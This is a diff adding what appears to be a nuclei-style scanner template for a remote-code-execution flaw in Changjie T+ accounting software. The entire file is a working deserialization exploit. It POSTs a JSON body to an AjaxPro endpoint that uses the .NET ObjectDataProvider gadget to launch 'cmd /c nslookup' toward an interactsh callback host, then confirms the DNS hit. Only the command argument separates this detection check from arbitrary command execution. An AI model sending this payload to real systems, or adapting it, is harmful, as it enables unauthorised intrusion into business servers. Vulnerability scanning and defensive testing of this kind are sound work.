@@ -1,0 +1,39 @@
+id: poc-yaml-changjie-tplus-app-code-Initinstance-rce
+
+info:
+  name: Changjie T+ ME_MemberIntegral_IntegralAdjust InitInstance RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog, deserialization, rce
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - method: POST
+    path:
+      - "/tplus/ajaxpro/Ufida.T.CodeBehind.DR.Member.MemberIntegral.ME_MemberIntegral_IntegralAdjust,App_Code.ashx?method=InitInstance"
+    headers:
+      X-Ajaxpro-Method: InitInstance
+      Content-Type: application/json
+    body: |
+      {
+        "arges":{
+          "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+          "MethodName":"Start",
+          "ObjectInstance":{
+            "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "StartInfo": {
+              "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+              "FileName":"cmd", "Arguments":"/c nslookup {{reverse}}"
+            }
+          }
+        }
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
